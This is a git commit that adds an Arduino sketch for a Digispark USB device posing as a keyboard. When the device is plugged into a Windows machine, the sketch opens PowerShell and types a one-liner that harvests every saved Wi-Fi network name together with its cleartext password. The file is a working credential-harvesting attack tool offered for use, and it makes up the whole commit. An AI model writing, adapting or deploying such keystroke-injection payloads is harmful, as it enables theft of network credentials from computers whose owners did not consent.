6a5e4f9597f47bf8c3e91052763fb763277a8d9b
Hassan Shehata <hassanshehata25895@gmail.com>
2019-12-10 22:21:55 +0200

    moved ino

---
+++ wifi-collector/wifi-collect.ino
@@ -0,0 +1,30 @@
+/*
+Copyright (c) 2019 Hassan Shehata
+Permission is hereby granted, free of charge, 
+to any person obtaining a copy of this software and associated documentation files
+(the "Software"), to deal in the Software without restriction, 
+including without limitation the rights to use, copy, modify, merge, 
+publish, distribute, sublicense, and/or sell copies of the Software,
+and to permit persons to whom the Software is furnished to do so
+*/
+
+#include "DigiKeyboard.h" //importing keyboard library
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0); //initialization
+  //Windows Payload
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // press windowsKey+R opens Run
+  delay(1000);
+  DigiKeyboard.print("powershell"); // write powershell 
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // opens powershell
+  delay(1000);
+  DigiKeyboard.print("$arr=$(netsh wlan show profile)-split': ';$res=@();for($i=10;$i-le$arr.Length-2;$i+=2){$ssid=$arr[$i];$pss=$(netsh wlan show profile name=$ssid key=clear|findstr \"Key Content\")-split': ';$res+=$arr[$i]+\",\"+$pss[1]};$res");// Get SSIDs
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(1000);
+  
+  for (;;) {
+    // stops re-execution // just remove the Digispark
+  }
+}
